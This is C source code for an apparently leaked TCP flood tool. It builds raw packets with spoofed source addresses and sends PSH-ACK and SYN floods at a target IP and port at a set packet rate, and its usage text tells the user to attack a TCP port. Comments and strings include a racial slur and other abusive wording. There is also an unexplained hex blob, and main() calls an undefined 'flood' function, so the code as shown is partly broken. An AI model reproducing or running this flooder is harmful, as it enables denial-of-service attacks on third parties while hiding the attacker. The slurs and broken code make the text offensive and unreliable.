
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<errno.h>
#include<netinet/tcp.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<pthread.h>
#include<stdint.h>
#include<unistd.h>
#include<sys/types.h>
#include<stdbool.h>
#include<time.h>
#define MAX_PACKET_SIZE 65500 //This Shows How Many Packets Are Being Transmitted Out Per Second. | First off why tf is this so high though.. Like are you trying to get filtered..????
#define PHI 0x9e3779b9
//Configurable Settings.
static unsigned long int Q[65500], c = 362436;
static unsigned int win = 63315;        //Large Nice Piece Of Payload Right Here Eh?
static const char PAYLOAD[] = "\x62\x62\x6c\x61\x7a\x69\x6e\x67\x20\x69\x73\x20\x67\x6f\x64\x20\x6c\x6d\x66\x61\x6f\x20\x79\x61\x6c\x6c\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x67\x65\x74\x20\x6f\x66\x66\x20\x6d\x79\x20\x64\x69\x63\x6b"; 
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
char ipv4src[17];
char * payload_data;
int Checksum;
int Source_Local = 0;
int Combination = 0;
static unsigned int floodport;
volatile unsigned int game = 1;
volatile int limiter;
volatile unsigned int packets_per_second;
volatile unsigned int sleeptime = 100;
struct tcpopts
{
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;

}; // TCP Options added by me bcuz why not LOL 
void init_rand(unsigned long int x)
{
	int i;//Calculating PHI
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
void print_ip(int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);//Created By Divine 2021
	x = t + c;
	if (x < c) {
	x++;
	c++;
	}
	return (Q[i] = r - x);
}
 
/* 
    96Bit Header, Used To Calculate TCP/CSUM
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

/* 
    Local-IPv4 Function Splitter.
*/
char *local_ipv4_target(char *baseip) {
    struct in_addr ipaddress, subnetmask;
    inet_pton(AF_INET, baseip, &ipaddress);
    inet_pton(AF_INET, "255.255.255.0", &subnetmask);
    unsigned long first_ip = ntohl(ipaddress.s_addr & subnetmask.s_addr);
    unsigned long last_ip = ntohl(ipaddress.s_addr | ~(subnetmask.s_addr));
    unsigned long ipfinal = htonl((rand() % (last_ip - first_ip + 1)) + first_ip);
    char *result = malloc(INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ipfinal, result, INET_ADDRSTRLEN);
    return result;
}
 
/*
    Checksum Calculation Function, Pretty Classic Recommend Coding Your Own
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

/*
    Replacing New Functions/Malloc
*/

char *replace_kgb(char *str, char *toReplace, int onlyNumbers) {
    char *result;
    int toReplaceLen = strlen(toReplace);
    int i, cnt = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (strstr(&str[i], toReplace) == &str[i]) {
            cnt++;
            i += toReplaceLen - 1;
        }
    }
    result = (char *)malloc(i + cnt * (1 - toReplaceLen) + 1); // Creating A Malloc Size.
    char randchar[2];
    randchar[1] = '\0';
    i = 0;
    while (*str) {
        if (strstr(str, toReplace) == str) {
            randchar[0] = (char)onlyNumbers ? (rand() % (48 - 57 + 1)) + 48 : (rand() % (122 - 97 + 1)) + 97;
            strcpy(&result[i], randchar);
            i += 1; // Finished Replacing The Len
            str += toReplaceLen;
        } else {
            result[i++] = *str++;
        }
    }
    result[i] = '\0';
    return result;
}

/*
    IPv4 Generation Function (Made by me, took me some time, But yh).
*/
char * ipv4_generator(char *par1, char * targettr, int Source_Local) {
	//return "37.148.208.161";
    if (Source_Local == 1) { // Yes Source Local Spoof.
        return local_ipv4_target(par1);
    } else { // Random IPv4
        snprintf(ipv4src, sizeof(ipv4src)-1, "%d.%d.%d.%d", rand()%254, rand()%254, rand()%254, rand()%254);
    }
    return ipv4src;
}

/*
    Starting Our Flood Threads.
*/
void *kgb_thread(void *par1) {
    // Target.
    char *targettr = (char *)par1;
    //Create a raw socket of type IPPROTO. (IPv4 Of course...)
    int s = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        //socket creation failed, may be because of non-root privileges.
        perror("Failed to create raw socket, Get root eh?");
        exit(1);
    }
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    //zero out the packet buffer
    memset (datagram, 0, 4096);
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data , "");

    // Source IPv4.
    strcpy(source_ip , "1.2.3.4"); // Initial address, changed later.
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr (targettr);
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + PAYLOADSIZE;
    iph->id = htonl (rand()); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = rand()%255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
    // IPv4 Checksum-
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    //TCP Header
    tcph->source = htons(rand());
    tcph->dest = htons (floodport);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5; //tcp header size
    tcph->fin=0;
    tcph->syn=0;
    tcph->rst=0;
    tcph->psh=1;
    tcph->ack=1;
    tcph->urg=0;
    tcph->window = htons (rand());  /* maximum allowed window size */
    tcph->check = 0;    //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );


    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    tcph->check = csum( (unsigned short*) pseudogram , psize);
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        //exit(0);
    }
    srand(time(NULL));
    int i;
    while (1)
    {
        //Send the packet
        sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin));
        iph->ttl = rand()%255;
        iph->id = htonl (rand());
        // Attack starts here 
        if (Combination == 1) {
            // PSH-ACK and SYN Packets.
            if (rand() % 2 == 1) {
                tcph->ack = 0;
                tcph->psh = 0;
                tcph->syn = 1;
            } else {
                tcph->ack = 1;
                tcph->psh = 1;
                tcph->syn = 0; 
            }
        }

            
        tcph->source = htons (rand());
        tcph->seq = htons(rand());
        tcph->window = htons (rand());

        //tcph->tcp_length = htons(strlen(data));
        tcph->check = 0;
        strcpy(source_ip , ipv4_generator((char *) par1, targettr, Source_Local));
        iph->saddr = inet_addr ( source_ip );
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
        
        if(strstr(payload_data, "%r%") != NULL || strstr(payload_data, "%n%") != NULL) {
            data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
            strcpy(data , replace_kgb(payload_data, "%r%", 0));
            strcpy(data , replace_kgb(data, "%n%", 1));
            iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            //tcph->len = htons(strlen(data));

            if (Checksum == 0) {
                tcph->check = 0;
            } else {
                psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );

                psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
                
                tcph->check = csum( (unsigned short*) pseudogram , psize);
            }
        } else {
            if (Checksum == 0) {
                tcph->check = 0;    
            } else {
                psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
                tcph->check = csum( (unsigned short*) pseudogram , psize);
            }
        }
        packets_per_second++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;

    }
}

/*
    Main function. (Threads, Arguments, PPS Limiter, Custom Payload, Etc, Etc..)
*/
int main(int argc, char *argv[ ]){
    if(argc < 9){
            fprintf(stdout, "Leaked by p6\n");
            fprintf(stdout, "[CLIENT-RAPE] Created/Skidripped By The Divine | Actual Finish Date 2018\n");
            fprintf(stdout, "[CLIENT-TCPH] Syntax: %s [TARGET] [PORT] [THREADS] [PPS] [TIME] [CSUM] [SOURCEIP] [COMBINATION]\n", argv[0]);
            fprintf(stdout, "[TUTORIAL] Please Make Sure You're Attacking With An TCP Port When Hitting An IP/HOST.\n");
            exit(-1);
    }
    int i = 0;
    //game = atoi(argv[3]);
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    payload_data = ".";
    floodport = atoi(argv[2]);
    Checksum = atoi(argv[6]);
    Source_Local = atoi(argv[7]);
    Combination = atoi(argv[8]);
    limiter = 0;    
    packets_per_second = 0;
    int multiplier = 100;
    pthread_t thread[num_threads];
    struct thread_data td[num_threads];

    for(i = 0;i<num_threads;i++){
    struct thread_data td[num_threads];
    pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
    char pthread[209] = "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94"; // SHITTY ASS PAYLOAD NIGGA HAHAHAHA
    pthread_create( &thread[i], NULL, &kgb_thread, (void *) argv[1]);
        //
    }
    //pthread_create( &thread[i], NULL, &syn_pkt, (void *) argv[1]);
    fprintf(stdout, "[SSH-DROP] Starting Threads...\n");
    fprintf(stdout, "[SSH-DROP] Setting Up Raw TCP Sockets | Sending Attack...\n");

    for(i = 0;i<(atoi(argv[5])*multiplier);i++) {
        usleep((1000/multiplier)*1000);
        if((packets_per_second*multiplier) > maxpps) {
            if(1 > limiter) {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25) {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        packets_per_second = 0;
    }

    return 0;
}